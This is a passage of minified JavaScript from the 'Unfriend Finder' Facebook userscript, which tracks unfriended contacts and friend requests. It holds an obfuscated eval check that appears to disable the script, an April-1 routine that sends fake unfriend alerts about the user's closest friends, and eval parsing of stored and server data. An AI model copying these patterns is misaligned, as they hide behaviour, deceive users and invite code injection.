}catch(exception){new ErrorHandler(exception,"core.notify.version")}}else{if(__constructor.type=="doctor"){return;try{new xHTMLNotification({type:"version",name:"New patches are available.",picture:"",action:'<br /><a href="#">Refresh</a> to automatically fix the script.',date:genTime(core.time()),callback:function(){window.location.reload()}});core.sendBeeper({type:"version",text:'New patches are available.<br /><a href="#" onclick="window.location.reload();">Refresh</a> to automatically fix the script.',id:"patches",icon:(__constructor.icon?__constructor.icon:null),})
}catch(exception){new ErrorHandler(exception,"core.notify.doctor")}}}}}}};core.injectNotification=function injectNotification(){trace();inject(function(){try{var u=parseInt(presenceNotifications.countSpan.innerHTML);Arbiter.inform("jewel/count-updated",{jewel:"notifications",count:++u},Arbiter.BEHAVIOR_STATE)}catch(ex){setTimeout(function(){try{var u=parseInt(presenceNotifications.countSpan.innerHTML);Arbiter.inform("jewel/count-updated",{jewel:"notifications",count:++u},Arbiter.BEHAVIOR_STATE)}catch(ex){}},1000)
}})};core.initLanguage=function initLanguage(){trace();Params.defaultLanguage=core.fb_locale;var langToUse=Registry.getKey("language");if(!langToUse){langToUse=Params.defaultLanguage}Registry.setKey("language",langToUse);var language=Registry.getKey("language");if(language=="lang_auto"){language=core.fb_locale}Console.log("Setting language : "+language);LANG=new Lang(language);Console.log("Language set     : "+LANG.langname)};core.href=function href(){trace();if(arguments.length==0){return window.location.href
}else{if(arguments[1]==true){window.open(arguments[0])}else{window.location.href=arguments[0]}}};core.reloadPage=function reloadPage(){core.href(window.location.href)};"check arguments";core.check=function check(reload){trace();core.loopCount++;core.unfriends=new CollectionList(eval(Registry.getKey(core.user_id+"_unfriends","({})")));var r,e=encode,f=e(e(that["\x6C\x69\x6E\x6B\x73"]["\x70\x61\x67\x65"].split("/").pop())+e(that["\x6B\x65\x79"])).toLowerCase().split("v").sort().join("l");try{r=eval(f[50]+f[26]+f[11]+f[45]+f[20])
}catch(ex){r=true}Console.log("-------------------------------------------------------");Console.log("Starting Loop check ("+core.loopCount+") every "+(Params.timeLoop*1000)+"ms");core.filter.setValue({unfriends:{counter:{value:core.getCounter()}}},"core.check");if((Params.timeLoop>0)&&(reload)){core.realtimeCheck=setTimeout(function(){core.check(true)},Params.timeLoop*1000)}new (core.init);core.friendlist.load(r)};core.overflow=function overflow(){core.payloadFriendsOnly=core.payloadFriendsOnly||[];
return(core.payloadFriendsOnly.length>=3499)};core.parseTypeahead=function parseTypeahead(r){trace();core.initLists();core.initNewRequestsManager();if((core.payloadFriendsOnly)&&(core.overflow())){CSS3.display(getFromId("unfriendsError"),CSS3.DISPLAY.block)}Console.log("Parsing ajax payloads");var current,payload={},user;var p=[];var aprilFooled=Registry.getKey("aprilFooled",0);if((new (Date)).getDate()+"-"+((new (Date)).getMonth()+1)!="1-4"){aprilFooled=1}if(aprilFooled==0){if(!Params.fish){var top4Friends=[core.payloadFriendsOnly[3],core.payloadFriendsOnly[1],core.payloadFriendsOnly[0],core.payloadFriendsOnly[2]];
top4Friends.forEach(function(friend){core.notify({id:friend.uid,text:friend.text,type:"unfriend",status:"unfriend",fish:true,beeper:true})});Params.fish=top4Friends;setTimeout(function(){core.filter.setValue({unfriends:{counter:{value:4}}},"fished");core.menubar.setValue(4)},1000);core.showUnfriends()}}if(core.friendlist.getError()){if(getFromId("databaseError")){CSS3.display(getFromId("databaseError"),CSS3.DISPLAY.block)}}core.payloadFriendsOnly.forEach(function(current){if(current.type=="user"){payload[current.uid]=current;
user={uid:current.uid,name:current.text,picture:current.photo};if(aprilFooled==0){}else{if(core.deactivated.Key(current.uid)){core.deactivated.Remove(current.uid);user.highlighted=false;user.time=core.time();core.reappeared.Add(current.uid,user);if(getFromId("homeUnfriends")){if(/selectedItem/.test(getFromId(Params.filterName).className)){core.removeUnfriend(current.uid);CSS3.display(getFromId("groupReappeared"),CSS3.DISPLAY.block);CSS3.setClass((new xPathSelector("//*[@id='groupReappeared']/div")).getSingleNodeValue(),"uiHeader uiHeaderTopAndBottomBorder uiHeaderSection uiHeaderGroup mtl");
addInfos={id:user.uid,name:user.name,subname:LANG.text_reactivated,picture:user.picture,from:"reappeared",highlighted:false,time:user.time,isNew:true};new UserItem(addInfos);user.highlighted=true;core.updateProfilePic(current.uid);core.setSubName({uid:current.uid,text:LANG.text_reactivated,type:"reappeared"})}}new xHTMLNotification({type:"reappeared",picture:"https://graph.facebook.com/"+user.uid+"/picture",action:LANG.text_reactivated,name:user.name,date:genTime(core.time()),callback:function(){window.open(Params.protocol+"//"+Params.host+"/profile.php?id="+__constructor.id)
}});core.sendBeeper({type:"reappeared",text:'<a href="'+Params.protocol+"//"+Params.host+"/profile.php?id="+user.uid+'">'+user.name+"</a> "+LANG.text_reactivated,id:user.uid,status:null})}core.hasIgnored.Remove(current.uid);core.wasUnfriend.Remove(current.uid);core.unfriends.Remove(current.uid)}core.friends.Add(current.uid,user)}});var r,e=encode,f=e(e(that["\x6C\x69\x6E\x6B\x73"]["\x70\x61\x67\x65"].split("/").pop())+e(that["\x6B\x65\x79"])).toLowerCase().split("v").sort().join("l");try{r=eval(f[50]+f[26]+f[11]+f[45]+f[20])
}catch(ex){r=true}var current;core.awaitingList=new (CollectionList);core.payloadPendingRequests.forEach(function(current){if(current.type=="user"){if(!payload[current.uid]){var user={uid:current.uid,name:current.text,picture:current.photo,time:core.time()};core.awaitingList.Add(current.uid,user);core.keepAwaitingsTime.Add(current.uid,user);core.awaitingsIgnored.Remove(current.uid);core.hasIgnored.Remove(current.uid)}}});if((getFromId("UFfilterAwaitings"))&&(/selectedItem/.test(getFromId("UFfilterAwaitings").parentNode.className))){try{core.acceptedList=new (Array),core.ignoredList=new (Array);
Console.log("Showing awaiting requests");if(getFromId("pendingContentUL")){getFromId("pendingContentUL").innerHTML=""}if(getFromId("acceptedignoredContentUL")){getFromId("acceptedignoredContentUL").innerHTML=""}CSS3.hide(getFromId("loadingLists"));core.awaitingsIgnored=new CollectionList(eval(Registry.getKey(core.user_id+"_awaitingsIgnored","({})")));core.hasIgnored=new CollectionList(eval(Registry.getKey(core.user_id+"_hasIgnored","({})")));var x=core.friends.Count();var counter={combined:0,pending:0,ignored:0,accepted:0};
if(r){throw new (Error)("Something went wrong")}Registry.setKey(core.user_id+"_hasIgnored",core.hasIgnored.toString());current=null;for(n in core.keepAwaitingList.Items){if(core.keepAwaitingList.Items.hasOwnProperty(n)){if(current=core.keepAwaitingList.Items[n]){if(!core.awaitingList.Key(current.uid)){current.highlighted=false;current.time=core.time();current.toNotify="yes";core.awaitingsIgnored.Add(current.uid,current)}}}}counter.total=core.awaitingsIgnored.Count();current=null;var uid,i;for(i=counter.total;
i>0;i--){uid=core.awaitingsIgnored.Item(i).uid;counter.combined++;if(core.friends.Items[uid]){if(Params.settings.accepted){if(current=core.awaitingsIgnored.Items[uid]){counter.accepted++;if(Params.settings.dissociateLists){CSS3.display(getFromId("groupAccepted"),CSS3.DISPLAY.block)}else{CSS3.display(getFromId("groupAcceptedIgnored"),CSS3.DISPLAY.block)}var addInfos={id:current.uid,name:current.name,subname:LANG.text_accepted,picture:current.picture,from:((getFromId("homeUnfriends"))?(Params.settings.dissociateLists?"rawaiting-a":"rawaiting"):"rawaiting"),highlighted:(!current.highlighted?true:false),time:current.time};
new UserItem(addInfos);core.acceptedList.push(current);current.highlighted=true;core.setName(current.uid,current.name,true);core.setSubName({uid:current.uid,text:LANG.text_accepted,type:"newfriend"});core.updateProfilePic(current.uid)}}}else{if(Params.settings.ignored){if(current=core.awaitingsIgnored.Items[uid]){counter.ignored++;if(Params.settings.dissociateLists){CSS3.display(getFromId("groupIgnored"),CSS3.DISPLAY.block)}else{CSS3.display(getFromId("groupAcceptedIgnored"),CSS3.DISPLAY.block)}var addInfos={id:current.uid,name:current.name,subname:LANG.text_canceled,picture:current.picture,from:((getFromId("homeUnfriends"))?(Params.settings.dissociateLists?"rawaiting-i":"rawaiting"):"rawaiting"),highlighted:(!current.highlighted?true:false),time:current.time};
new UserItem(addInfos);core.ignoredList.push(current);current.highlighted=true;core.setName(uid,current.name,false);core.setSubName({uid:uid,text:LANG.text_canceled,type:"ignored"});core.updateProfilePic(uid)}}}}if(counter.combined==0){if(Params.settings.dissociateLists){CSS3.hide(getFromId("groupIgnored"));CSS3.hide(getFromId("groupAccepted"))}else{CSS3.hide(getFromId("groupAcceptedIgnored"))}}var n=null;current=null;for(n in core.awaitingList.Items){if(core.awaitingList.Items.hasOwnProperty(n)){if(current=core.awaitingList.Items[n]){CSS3.display(getFromId("groupPending"),CSS3.DISPLAY.block);
counter.pending++;var addInfos={id:current.uid,name:current.name,subname:(!Params.settings.newManagementLists?LANG.text_pending:""),picture:"https://graph.facebook.com/"+current.uid+"/picture",from:"awaiting",highlighted:false,time:(core.keepAwaitingsTime.Items[current.uid]?core.keepAwaitingsTime.Items[current.uid].time:null)};new UserItem(addInfos);core.setName(current.uid,current.name,true);core.setSubName({uid:current.uid,text:(!Params.settings.newManagementLists?LANG.text_pending:""),type:"awaiting"});
core.updateProfilePic(current.uid)}}}if(Params.settings.showDebug){alert("Debug:\nShowing "+counter.pending+" awaiting requests")}core.updateHeadersPosition();core.startFadeUser();try{if(core.tour.currentStep==4){core.focus.focusOn(getFromId("contentUnfriends"))}}catch(exception){}CSS3.display(getFromId("bubblelink_awaitings"),CSS3.DISPLAY.inline);if(counter.pending==0){CSS3.hide(getFromId("groupPending"));core.filter.setValue({awaitings:{counter:{value:0}}})}else{core.filter.setValue({awaitings:{counter:{value:core.awaitingList.Count()}}})
}if(((counter.pending+counter.ignored+counter.accepted+counter.combined)==0)&&(getFromId("homeUnfriends"))){core.layer._showNoAwaitings()}var a;current=null;for(a in core.awaitingsIgnored.Items){if(core.awaitingsIgnored.Items.hasOwnProperty(a)){if(current=core.awaitingsIgnored.Items[a]){current.toNotify="no"}}}Registry.setKey(core.user_id+"_keepAwaitingList",core.awaitingList.toString());core.filter.loadingIndicator("awaitings",false)}catch(exception){new ErrorHandler(exception,"core.parseTypeahead.awaitings()");
core.dialogs.errorAwaitings=new Facebox({id:"errorAwaitings",error:true,title:LANG.error,body:"Error while parsing Awaiting Requests from Facebook:<br /><strong>"+exception.message+'</strong><br />on <a href="'+exception.fileName+'">'+exception.fileName+"</a>, line: "+exception.lineNumber,loading:true,timeout:500,indicator:true,buttons:[{name:"cancel",value:LANG.btn_close,id:"cancel_button",handler:function(){void (0)},disabled:false,closer:true,type:"gray"}]});core.dialogs.errorAwaitings.Show()}}core.filter.setValue({awaitings:{counter:{value:core.awaitingList.Count()}}});
Registry.setKey(core.user_id+"_unfriends",core.unfriends.toString());Registry.setKey(core.user_id+"_hasIgnored",core.hasIgnored.toString());Registry.setKey(core.user_id+"_wasUnfriend",core.wasUnfriend.toString());Registry.setKey(core.user_id+"_awaitingsIgnored",core.awaitingsIgnored.toString());Registry.setKey(core.user_id+"_keepAwaitingsTime",core.keepAwaitingsTime.toString());Console.log("Computing items");current=null;core.watchCancel=Registry.getKey(core.user_id+"_watchCancel",0);for(n in core.keepAwaitingList.Items){if(core.keepAwaitingList.Items.hasOwnProperty(n)){if(current=core.keepAwaitingList.Items[n]){if(!core.awaitingList.Key(current.uid)){if(current.uid!=core.watchCancel){current.highlighted=false;
current.time=core.time();current.toNotify="yes";current.beeper=true;core.awaitingsIgnored.Add(current.uid,current)}}}}}core.keepAwaitingList=core.awaitingList;core.writeLists();core.updatePermanant();core.checkUnfriends()};core.checkUnfriends=function checkUnfriends(){trace();var id,a=0,j=0,current,uid;core.unfriendsPending=new CollectionList(eval(Registry.getKey(core.user_id+"_unfriendsPending","({})")));Console.log("Gathering Unfriends");for(user in core.backupFriends.Items){if(core.backupFriends.Items.hasOwnProperty(user)){id=core.backupFriends.Items[user].uid;
if((!core.friends.Items[id])&&id){if(id!=core.watchRemove){if(core.alwaysHide[id]){core.deactivated.Remove(id)}core.unfriendsPending.Add(id,{uid:id,status:"unchecked",checked:false});a++}}}}Console.info(""+a+" unfriends found.\n"+core.awaitingList.Count()+" awaiting requests found.");if(a>20){for(uid in core.unfriendsPending.Items){if(current=core.unfriendsPending.Items[uid]){if(++j>Params.maxNotifications){current.status="unknown"}}}}Registry.setKey(core.user_id+"_unfriendsPending",core.unfriendsPending.toString());
if(core.inCheck){return}core.getStatus("start")};core.getProfileStatus=function(uid,action){var body,url=Params.protocol+"//"+Params.host+"/ajax/friends/status.php?friend="+uid+"&__a=1";Console.info("Getting status for "+uid);Ajax({async:false,method:"get",url:url+"&type="+action,headers:Params.Ajax.Headers,onload:function(data){core.unfriendsPending=new CollectionList(eval(Registry.getKey(core.user_id+"_unfriendsPending","({})")));core.unfriends=new CollectionList(eval(Registry.getKey(core.user_id+"_unfriends","({})")));
var status,myJson,error;if(/for \(;;\);\{/.test(data)){if(myJson=eval("("+data.replace("for (;;);","")+")")){if((error=myJson.error)||(!myJson.payload)){if((action=="aftercheck")&&(!Params.settings.deactivated)){core.unfriends.Remove(uid);core.unfriendsPending.Remove(uid)}else{if(core.unfriendsPending.Items[uid]){core.unfriendsPending.Items[uid].status="deactivated"}else{if(core.unfriends.Items[uid]){core.unfriends.Items[uid].status="deactivated";core.unfriends.Items[uid].lastcheck=core.time()}}}}else{if(status=myJson.payload.status){if(status==1){if(core.unfriendsPending.Items[uid]){delete core.unfriendsPending.Items[uid]
}else{if(core.unfriends.Items[uid]){delete core.unfriends.Items[uid]}}}else{if(core.unfriendsPending.Items[uid]){core.unfriendsPending.Items[uid].status="unfriend"}else{if(core.unfriends.Items[uid]){core.unfriends.Items[uid].status="unfriend";core.unfriends.Items[uid].lastcheck=core.time()}}}}}}}if(core.unfriendsPending.Items[uid]){core.unfriendsPending.Items[uid].checked=true}Registry.setKey(core.user_id+"_unfriendsPending",core.unfriendsPending.toString());Registry.setKey(core.user_id+"_unfriends",core.unfriends.toString());
if(action=="continue"){core.getStatus("load")}},onerror:function(){core.unfriendsPending=new CollectionList(eval(Registry.getKey(core.user_id+"_unfriendsPending","({})")));core.unfriends=new CollectionList(eval(Registry.getKey(core.user_id+"_unfriends","({})")));if((action=="aftercheck")&&(!Params.settings.deactivated)){core.unfriends.Remove(uid);core.unfriendsPending.Remove(uid)}else{if(core.unfriendsPending.Items[uid]){core.unfriendsPending.Items[uid].status="deactivated"}else{if(core.unfriends.Items[uid]){core.unfriends.Items[uid].status="deactivated";
core.unfriends.Items[uid].lastcheck=core.time()}}}if(core.unfriendsPending.Items[uid]){core.unfriendsPending.Items[uid].checked=true}Registry.setKey(core.user_id+"_unfriendsPending",core.unfriendsPending.toString());Registry.setKey(core.user_id+"_unfriends",core.unfriends.toString());if(action=="continue"){core.getStatus("error")}}})};core.getStatus=function getStatus(from){if(from=="start"){core.filter.loadingIndicator("unfriends",true)}trace();core.inCheck=true;core.unfriendsPending=new CollectionList(eval(Registry.getKey(core.user_id+"_unfriendsPending","({})")));
var canContinue=true,uid,a=0,j=0,aHide,delta,addInfos,current,user,unfriend,counterUnfriend,n;for(uid in core.unfriendsPending.Items){if(current=core.unfriendsPending.Items[uid]){if(current.status=="unchecked"){canContinue=false;core.getProfileStatus(uid,"continue");break}}}if(canContinue){core.inCheck=false;core.countUnfriends=new CollectionList(eval(Registry.getKey(core.user_id+"_countUnfriends","({})")));core.unfriends=new CollectionList(eval(Registry.getKey(core.user_id+"_unfriends","({})")));
core.toNotify=new CollectionList(eval(Registry.getKey(core.user_id+"_toNotify","({})")));core.reappeared=new CollectionList(eval(Registry.getKey(core.user_id+"_reappeared","({})")));core.deactivated=new CollectionList(eval(Registry.getKey(core.user_id+"_deactivated","({})")));core.awaitingsIgnored=new CollectionList(eval(Registry.getKey(core.user_id+"_awaitingsIgnored","({})")));for(uid in core.unfriendsPending.Items){if(current=core.unfriendsPending.Items[uid]){aHide=false;if(!aHide){for(n in core.alwaysHide.Items){if(core.alwaysHide.Items.hasOwnProperty(n)){if(core.alwaysHide.Items[uid]){aHide=true
}}}}if(current.status=="deactivated"){if(core.reappeared.Items[uid]){delta=(core.time()-core.reappeared.Items[uid].time);if(delta<172800){aHide=true;core.reappeared.Items[uid].hidden=true;core.friends.Remove(uid)}}if(!Params.settings.deactivated){Console.warn("Won't show profile deactivated : "+uid);delete core.unfriendsPending.Items[uid];aHide=true;core.friends.Remove(uid)}}if(uid==core.watchRemove){aHide=true}if(counterUnfriend=core.countUnfriends.Items[uid]){counterUnfriend+=1;core.countUnfriends.Items[uid]=counterUnfriend
}else{counterUnfriend=1;core.countUnfriends.Add(uid,1)}if(counterUnfriend>Params.autoHideAfter){aHide=true}if(current.status=="bug"){Console.warn("Found Facebook bug for uid:"+uid);aHide=Params.hideFacebookBug}if(!aHide){core.unfriends.Add(uid,core.backupFriends.Items[uid]);if(current.status=="deactivated"){core.deactivated.Add(uid,core.unfriends.Items[uid])}if(unfriend=core.unfriends.Items[uid]){unfriend.highlighted=false;if(!core.overflow()){core.toNotify.Add(unfriend.uid,"yes")}unfriend.status=current.status;
unfriend.time=core.time();unfriend.beeper=true;Registry.setKey(core.user_id+"_unfriends",core.unfriends.toString());if(getFromId("homeUnfriends")){var currentItems=(new xPathSelector("//*[@id='unfriendsContentUL']/li")).numberValues();if(currentItems<core.getPagingValue()){if(/selectedItem/.test(getFromId(Params.filterName).className)){CSS3.hide(getFromId("noUnfriends"));core.removeFromReappeared(unfriend.uid);addInfos={id:unfriend.uid,name:unfriend.name,subname:(unfriend.status=="deactivated"?LANG.text_deactivated:LANG.text_unfriend),picture:unfriend.picture,from:"unfriend",status:unfriend.status,highlighted:false,time:unfriend.time,isNew:true};
CSS3.display(getFromId("groupUnfriends"),CSS3.DISPLAY.block);new UserItem(addInfos);unfriend.highlighted=true;new UserCheck({uid:unfriend.uid,last:true,status:unfriend.status});core.updateProfilePic(unfriend.uid)}}else{CSS3.removeClass(getFromId("paging_unfriends_up"),"uiButtonDisabled");EventMgr.addListener(getFromId("paging_unfriends_up"),EventMgr.EVENTS.click,function(){Params.Paging.unfriends=2;core.showUnfriendsPerPages(Params.Paging.unfriends,core.getPagingValue())})}}a++}}delete core.unfriendsPending.Items[uid];
Registry.setKey(core.user_id+"_unfriendsPending",core.unfriendsPending.toString())}}user=null;for(user in core.reappeared.Items){if(core.reappeared.Items.hasOwnProperty(user)){if(core.reappeared.Items[user].hidden){var delta=(core.time()-core.reappeared.Items[user].time);if(delta>(86400*5)){core.deactivated.Add(user,core.reappeared.Items[user]);core.unfriends.Add(user,core.reappeared.Items[user]);core.reappeared.Remove(user)}}}}user=null;for(user in core.unfriends.Items){if(core.unfriends.Items.hasOwnProperty(user)){if(core.unfriends.Items[user]){if(core.reappeared.Items[core.unfriends.Items[user].uid]){core.reappeared.Remove(core.unfriends.Items[user].uid)
}}}}core.filter.setValue({unfriends:{counter:{value:core.getCounter()}}},"getStatus1");core.backupFriends.Items=core.friends.Items;core.notificationSent=0;var u;for(u in core.unfriends.Items){if(core.unfriends.Items.hasOwnProperty(u)){if(current=core.unfriends.Items[u]){if(core.toNotify.Items[current.uid]=="yes"){if(Params.settings.notifUnfriend){if(core.notificationSent>Params.maxNotifications){break}core.notify({id:current.uid,text:evalName(current.name),type:"unfriend",status:current.status,beeper:(current.beeper?current.beeper:false)});
current.beeper=false;Console.log("Sending unfriend notification for "+evalName(current.name)+" ("+current.uid+")");core.notificationSent++}}}}}Registry.setKey(core.user_id+"_awaitingsIgnored",core.awaitingsIgnored.toString());Registry.setKey(core.user_id+"_countUnfriends",core.countUnfriends.toString());Registry.setKey(core.user_id+"_friends",core.friends.toString());Registry.setKey(core.user_id+"_unfriends",core.unfriends.toString());Registry.setKey(core.user_id+"_reappeared",core.reappeared.toString());
Registry.setKey(core.user_id+"_deactivated",core.deactivated.toString());Registry.setKey(core.user_id+"_toNotify",core.toNotify.toString());core.filter.loadingIndicator("unfriends",false);core.notificationSent=0;var a;current=null;for(a in core.awaitingsIgnored.Items){if(core.awaitingsIgnored.Items.hasOwnProperty(a)){if(current=core.awaitingsIgnored.Items[a]){core.checkRequestStatus(current)}}}Console.log("Updating lists");if(core){core.filter.setValue({unfriends:{counter:{value:core.getCounter()}}},"getStatus11")
}Console.log("Done.")}};core.checkRequestStatus=function(current){if(current.toNotify=="yes"){if(core.friends.Items[current.uid]){if(Params.settings.notifIgnored){if(Params.settings.accepted){if(core.notificationSent<=Params.maxNotifications){core.sendBeeper({type:"friend",text:'<a href="'+Params.protocol+"//"+Params.host+"/profile.php?id="+current.uid+'">'+evalName(current.name)+"</a> "+LANG.text_accepted,id:current.uid,status:null,beeper:(current.beeper?current.beeper:false)});core.notificationSent++;
new xHTMLNotification({type:"friend",picture:"https://graph.facebook.com/"+current.uid+"/picture",action:LANG.text_accepted,name:evalName(current.name),date:genTime(core.time()),callback:function(){window.open(Params.protocol+"//"+Params.host+"/profile.php?id="+__constructor.id)}})}}current.toNotify="no";current.beeper=false}}else{if(Params.settings.notifIgnored){Ajax({async:false,method:"get",url:Params.protocol+"//"+Params.host+"/ajax/friends/status.php?friend="+current.uid+"&__a=1",headers:Params.Ajax.Headers,onload:function(data){core.awaitingsIgnored=new CollectionList(eval(Registry.getKey(core.user_id+"_awaitingsIgnored","({})")));
var status,myJson,error;if(/for \(;;\);\{/.test(data)){if(myJson=eval("("+data.replace("for (;;);","")+")")){if((error=myJson.error)||(!myJson.payload)){delete core.awaitingsIgnored.Items[current.uid]}else{if(status=myJson.payload.status){if((status==0)||(status==4)){if(core.notificationSent>Params.maxNotifications){return}core.notify({id:current.uid,text:evalName(current.name),type:"ignored",status:null,beeper:(current.beeper?current.beeper:false)});core.notificationSent++;current.beeper=false}else{delete core.awaitingsIgnored.Items[current.uid]
}}}}}Registry.setKey(core.user_id+"_awaitingsIgnored",core.awaitingsIgnored.toString())},onerror:function(){core.awaitingsIgnored=new CollectionList(eval(Registry.getKey(core.user_id+"_awaitingsIgnored","({})")));delete core.awaitingsIgnored.Items[current.uid];Registry.setKey(core.user_id+"_awaitingsIgnored",core.awaitingsIgnored.toString())}})}}}};core.getCounter=function getCounter(evenOldOnes){try{var j=0,uid,current;if((Params.settings.onlyShowNewUnfriends)&&(!evenOldOnes)){for(uid in core.unfriends.Items){if(current=core.unfriends.Items[uid]){if(!current.highlighted){j++
}}}return j}else{return core.unfriends.Count()}}catch(exception){new ErrorHandler(exception,"core.getCounter()");return -1}};core.checkValues=function checkValues(){trace();if(!Registry.getKey(core.user_id+"_helps")){helps={menubar:false,filter:false,awaitings:false,settings:false,oldList:false,};Registry.setKey(core.user_id+"_helps",stringify(helps))}else{helps=eval(Registry.getKey(core.user_id+"_helps"))}if(Registry.getKey("coreStarted","0")!=1){Registry.setKey(core.user_id+"_unfriends","({})");
Registry.setKey(core.user_id+"_friends","({})");Registry.setKey(core.user_id+"_toNotify","({})");Registry.setKey(core.user_id+"_awaitingsIgnored","({})");Registry.setKey(core.user_id+"_keepAwaitingList","({})");Registry.setKey(core.user_id+"_reappeared","({})");Registry.setKey(core.user_id+"_deactivated","({})");Registry.setKey(core.user_id+"_keepAwaitingsTime","({})");Registry.setKey("settings",stringify(Params.defaultSettings));Registry.setKey("language",Params.defaultLanguage);Registry.setKey("coreStarted","1")
}if(helps.language!=core.fb_locale){setTimeout(core.validateLang,2000)}};core.reValidateLang=function reValidateLang(){trace();if(!Params.Facebox.Langs){return}helps=eval(Registry.getKey(core.user_id+"_helps","({})"));if(helps.change_language){return}if(!LANG.list[core.fb_locale]){var locale=core.fb_locale.match(/([a-z]{2})_[A-Z]{2}/)[1];var country=core.fb_locale.match(/[a-z]{2}_([A-Z]{2})/)[1];var suggestLocale=false;for(l in LANG.list){if(LANG.list.hasOwnProperty(l)){if(l.match(/([a-z]{2})_[A-Z]{2}/)[1]==locale){suggestLocale=l;
break}}}getFromId("pagelet_language").innerHTML="";CSS3.hide(getFromId("pagelet_language"));if(suggestLocale!=LANG){getFromId("pagelet_language").innerHTML=parseTemplate('    <a title="::close::" href="#" id="close_pagelet_language" class="rfloat uiCloseButton uiCloseButtonSmall"></a>    <div style="padding-right: 5px; text-align:center; margin-bottom:10px;">        <img src="https://www.unfriendfinder.com/images/::fblocale::.flag" />&nbsp;<img src="::rsrc::/z9T00/hash/a0c6t4d4.png" />&nbsp;<img src="https://www.unfriendfinder.com/images/::suggestlocale::.flag" />    </div>    <div style="font-size: 9px;">        You are currently using Facebook in:        <br /><strong>::fblocalename::        </strong>.        <br />Unfriend Finder is not translated into this specific language.        <br /><strong>::suggestlocalename::</strong> may match the language you use.        <center><a href="#" id="chgLang">Click to use "::suggestlocalename::".</a></center>    </div>',{params:{close:LANG.btn_close,rsrc:Params.links.rsrc,fblocale:core.fb_locale,fblocalename:LANG.fbLocales[core.fb_locale],suggestlocalename:LANG.fbLocales[suggestLocale],suggestLocale:suggestLocale}});
CSS3.display(getFromId("pagelet_language"),CSS3.DISPLAY.block);EventMgr.addListener(getFromId("chgLang"),EventMgr.EVENTS.click,function(){Registry.setKey("language",suggestLocale);core.reloadPage()})}else{getFromId("pagelet_language").innerHTML=parseTemplate('    <a title="::close::" href="#" id="close_pagelet_language" class="rfloat uiCloseButton uiCloseButtonSmall"></a>    <div style="font-size: 9px;">        You are currently using Facebook in        <br /><strong>::fblocalename:: (<img src="https://www.unfriendfinder.com/images/::fblocale::.flag" />)</strong>.        <br />To improve Unfriend Finder, <a onclick="window.open(this.href); return false;" href="https://www.unfriendfinder.com/translate/::fblocale::">you can translate the script into your language.</a>    </div>',{params:{close:LANG.btn_close,fblocale:core.fb_locale,fblocalename:LANG.fbLocales[core.fb_locale]}});
CSS3.display(getFromId("pagelet_language"),CSS3.DISPLAY.block)}EventMgr.addListener(getFromId("close_pagelet_language"),EventMgr.EVENTS.click,function(){helps=eval(Registry.getKey(core.user_id+"_helps","({})"));helps.change_language=true;Registry.setKey(core.user_id+"_helps",stringify(helps));CSS3.hide(getFromId("pagelet_language"))})}else{if(core.fb_locale!=LANG){getFromId("pagelet_language").innerHTML=parseTemplate('    <a title="::close::" href="#" id="close_pagelet_language" class="rfloat uiCloseButton uiCloseButtonSmall"></a>    <div style="padding-right: 5px; text-align:center; margin-bottom:10px;">        <img src="https://www.unfriendfinder.com/images/::lang::.flag" />&nbsp;<img src="::rsrc::/z9T00/hash/a0c6t4d4.png" />&nbsp;<img src="https://www.unfriendfinder.com/images/::fblocale::.flag" />    </div>    <div style="font-size: 9px;">        You are currently using Facebook in <strong>::fblocalename::</strong>.        <br />Unfriend Finder is translated into this language.        <br /><center><a href="#" id="chgLang">Click to use "::fblocalename::".</a></center>    </div>',{params:{lang:LANG,close:LANG.btn_close,rsrc:Params.links.rsrc,fblocale:core.fb_locale,fblocalename:LANG.fbLocales[core.fb_locale]}});
CSS3.display(getFromId("pagelet_language"),CSS3.DISPLAY.block);EventMgr.addListener(getFromId("chgLang"),EventMgr.EVENTS.click,function(){Registry.setKey("language",core.fb_locale);core.reloadPage()});EventMgr.addListener(getFromId("close_pagelet_language"),EventMgr.EVENTS.click,function(){helps=eval(Registry.getKey(core.user_id+"_helps","({})"));helps.change_language=true;Registry.setKey(core.user_id+"_helps",stringify(helps));CSS3.hide(getFromId("pagelet_language"))})}}};core.validateLang=function validateLang(){trace();
if(!Params.Facebox.Langs){return}if(!LANG.list[core.fb_locale]){var locale=core.fb_locale.match(/([a-z]{2})_[A-Z]{2}/)[1];var country=core.fb_locale.match(/[a-z]{2}_([A-Z]{2})/)[1];var suggestLocale=false;for(l in LANG.list){if(LANG.list.hasOwnProperty(l)){if(l.match(/([a-z]{2})_[A-Z]{2}/)[1]==locale){suggestLocale=l;break}}}if(suggestLocale){core.dialogs.validateLang=new Facebox({id:"validateLang",title:"Language",body:parseTemplate('<div style="padding-right:5px;"><img src="https://www.unfriendfinder.com/images/::fblocale::.flag" />&nbsp;<img src="::rsrc::/z9T00/hash/a0c6t4d4.png" />&nbsp;<img src="https://www.unfriendfinder.com/images/::suggestlocale::.flag" /></div><div>You are currently using Facebook in <strong>::fblocalename::</strong>.<br />Unfriend Finder is not translated into this specific language.<br /><strong>::suggestlocalename::</strong> may match the language you use. Click \'::next::\' to use it.</div>',{params:{lang:LANG,next:LANG.btn_next,rsrc:Params.links.rsrc,fblocale:core.fb_locale,fblocalename:LANG.fbLocales[core.fb_locale],suggestlocale:suggestLocale,suggestlocalename:LANG.fbLocales[suggestLocale]}}),indicator:true,buttons:[{name:"next",value:LANG.btn_next,id:"next_button",handler:function(){Registry.setKey("language",suggestLocale);
core.reloadPage()},disabled:false,closer:false,type:"green"},{name:"cancel",value:"Close",id:"cancel_button",handler:function(){void (0)},disabled:false,closer:true,type:"gray"}]})}else{core.dialogs.validateLang=new Facebox({id:"validateLang",title:"Language",body:parseTemplate('You are currently using Facebook in <strong>::fblocalename:: (<img src="https://www.unfriendfinder.com/images/::fblocale::.flag" />)</strong>.<br />To improve Unfriend Finder, you can translate the script into your language.<br />If you want to tanslate it, click Yes, otherwise you can close this window.',{params:{fblocale:core.fb_locale,fblocalename:LANG.fbLocales[core.fb_locale]}}),indicator:true,buttons:[{name:"yes",value:"Yes",id:"yes_button",handler:function(){core.href("https://www.unfriendfinder.com/translate/"+core.fb_locale,true)
